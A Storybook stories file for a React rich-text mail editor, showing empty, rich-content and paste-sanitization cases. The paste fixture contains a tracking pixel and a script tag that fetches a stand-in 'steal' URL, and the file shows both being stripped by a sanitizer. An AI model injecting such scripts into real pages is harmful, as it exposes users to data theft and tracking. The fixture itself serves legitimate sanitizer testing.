import type { Meta, StoryObj } from "@storybook/react";
import { sanitizeAdoptedHtml } from "../lib/adopted-html.js";
import { RichTextEditor } from "./rich-text-editor.js";

const meta: Meta<typeof RichTextEditor> = {
	title: "Mail/RichTextEditor",
	component: RichTextEditor,
	parameters: { layout: "centered" },
	decorators: [
		(Story) => (
			<div className="w-[640px] overflow-hidden rounded-md border border-line bg-canvas">
				<Story />
			</div>
		),
	],
};
export default meta;

type Story = StoryObj<typeof RichTextEditor>;

const RICH_DOCUMENT = [
	"<h2>Quarterly numbers</h2>",
	"<p>Highlights <strong>this quarter</strong>, with the detail below.</p>",
	"<ul><li>Revenue up 14%</li><li>Costs flat</li></ul>",
	"<table><thead><tr><th>Region</th><th>Total</th></tr></thead>",
	"<tbody><tr><td>EMEA</td><td>412</td></tr>",
	"<tr><td>Americas</td><td>388</td></tr></tbody></table>",
	'<p>Source: <a href="https://example.com/report">the full report</a>.</p>',
].join("");

/**
 * What a web page actually puts on the clipboard: presentation on every
 * element, a tracking pixel, a script, and Word's conditional markup.
 */
const CLIPBOARD_HTML = [
	'<meta charset="utf-8">',
	"<!--[if gte mso 9]><xml><w:WordDocument/></xml><![endif]-->",
	"<style>.hdr{color:#c00}</style>",
	'<h3 class="hdr" style="color:#c00;font-family:Verdana">Release checklist</h3>',
	'<ol><li style="margin:0">Cut the tag</li><li>Publish the images</li></ol>',
	'<table style="border:2px dashed #c00"><tbody>',
	"<tr><th>Step</th><th>Owner</th></tr>",
	"<tr><td>Tag</td><td>Ada</td></tr></tbody></table>",
	'<img src="http://tracker.example/px.gif" width="1" height="1">',
	'<script>fetch("https://tracker.example/steal")</script>',
].join("");

export const Empty: Story = {
	name: "Empty",
	args: {},
};

export const RichContent: Story = {
	name: "Rich content with a table",
	args: { initialHtml: RICH_DOCUMENT },
};

/**
 * The document after that clipboard has gone through the paste profile: the
 * heading, the list and the table survive; the styling, the pixel and the
 * script do not.
 */
export const PasteResult: Story = {
	name: "After pasting a web page",
	args: { initialHtml: sanitizeAdoptedHtml(CLIPBOARD_HTML) },
};
